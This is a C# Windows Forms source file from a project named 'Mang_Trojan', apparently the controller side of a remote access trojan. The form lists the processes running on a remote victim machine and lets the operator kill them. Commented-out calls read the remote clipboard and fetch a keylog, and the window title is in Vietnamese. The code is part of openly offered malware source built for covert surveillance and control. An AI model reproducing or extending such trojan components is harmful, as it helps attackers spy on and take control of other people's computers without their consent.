using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class Programs : Form
    {   
        RemoteObject.ScreenObject hostInstance;
        private ListViewColumnSorter sorter;
        private ListViewHitTestInfo selected;
        List<string> keylog;

        public Programs(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            sorter = new ListViewColumnSorter();
            listView1.ListViewItemSorter = sorter;
            Renew();
        }
        private void Renew()
        {
            listView1.Items.Clear();
         string programs = hostInstance.GetProcesses();
         //string clipborad = hostInstance.getClipboardText();

         //keylog = hostInstance.getKey();
            //test
            //MessageBox.Show(clipborad);
           

         string[] rows = programs.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
         foreach (string row in rows)
         {
             if (row != string.Empty)
             {
                 string[] fields = row.Split(new string[] { "|*|" }, StringSplitOptions.RemoveEmptyEntries);
                 ListViewItem item = new ListViewItem(fields[0]);

                for(int i=1;i<fields.Length;i++){
                    
                     item.SubItems.Add(fields[i]);
                     
                 }
                 listView1.Items.Add(item);
             }
         }
            
        }

        private void listView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == sorter.SortColumn)
            {
                if (sorter.Order == SortOrder.Ascending)
                {
                    sorter.Order = SortOrder.Descending;
                }
                else
                {
                    sorter.Order = SortOrder.Ascending;
                }
            }
            else
            {
                sorter.SortColumn = e.Column;
                sorter.Order = SortOrder.Ascending;
            }
            listView1.Sort();
        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                contextMenuStrip1.Show(listView1, e.Location);
                selected = listView1.HitTest(e.X, e.Y);

            }
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hostInstance.KillProcess(Convert.ToInt32(selected.Item.Text));
            listView1.Items.Remove(selected.Item);
        }

        private void refreshListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Renew();
        }

        private void Programs_Load(object sender, EventArgs e)
        {
            this.Text = "Tiến trình đang chạy trên máy"+hostInstance.GetComputerName();
        }

    }
}
